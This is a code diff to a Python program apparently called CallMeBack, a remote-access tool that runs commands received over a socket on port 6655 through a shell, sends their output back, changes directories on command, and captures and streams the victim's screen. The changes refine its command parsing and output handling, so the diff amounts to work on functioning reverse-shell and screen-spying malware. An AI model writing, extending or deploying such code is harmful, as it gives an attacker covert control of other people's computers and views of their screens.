@@ -16,7 +16,7 @@ hostname = socket.gethostname()
 IPaddress = socket.gethostbyname(hostname)
 Port = int(6655)
 Stopthread = 0
-KeyWord = ['stream' ,'screenshot' ,'quit','kill']
+KeyWord = ['Stream' ,'screenshot' ,'quit','cd']
 class CallMeBack:
     def __init__(self):
         global Stopthread
@@ -34,7 +34,6 @@ class CallMeBack:
                 screen = capture_screen()
                 ret, buffer = cv2.imencode('.jpg', screen)
                 frame = buffer.tobytes()
-                print(Stopthread)
                 if Stopthread == 1 :
                    break
                 yield (b'--frame\r\n'
@@ -62,27 +61,30 @@ class CallMeBack:
             data = SendBack.recv(4096).decode('latin-1')
             try:
                 Data = subprocess.run(data,shell=True,capture_output=True)
-                path = os.getcwd()+ ' > '
-                
+                path = os.getcwd()+ ' > '  
                 if data in KeyWord:
                     pass
                 elif 'returncode=1' in str(Data) :
                    Except = str(data) +' not recognized as an internal or external command'.replace('\n','')
                    SendBack.sendall(bytes(path.encode())), SendBack.sendall(Except.encode()+'\n'.encode('latin-1'))
                    SendBack.sendall(bytes(path.encode()))
-                elif str(Data) ==None:
+                elif str(Data) ==  None:
                      SendBack.sendall(bytes(path.encode()))
-                else: 
-                    Data =bytes(Data.stdout.decode('latin-1').encode())
-                    SendBack.sendall(Data)
-                    SendBack.sendall(bytes(path.encode()))
+                else:
+                    if 'cd' in data :
+                        pass
+                    else:  
+                        Data =bytes(Data.stdout.decode('latin-1').encode())
+                        SendBack.sendall(Data)
+                        SendBack.sendall(bytes(path.encode()))
             except Exception  :
                 continue
             if 'quit' in data:
                 break
             if 'cd' in data:
                 try:
-                    os.chdir(str(data.split()[1].replace('\n','')))
+                    os.chdir(str(" ".join(data.split()[1:])))
+                    path = os.getcwd()+ ' > '
                 except Exception:
                     continue
             if 'screenshot' in data :      
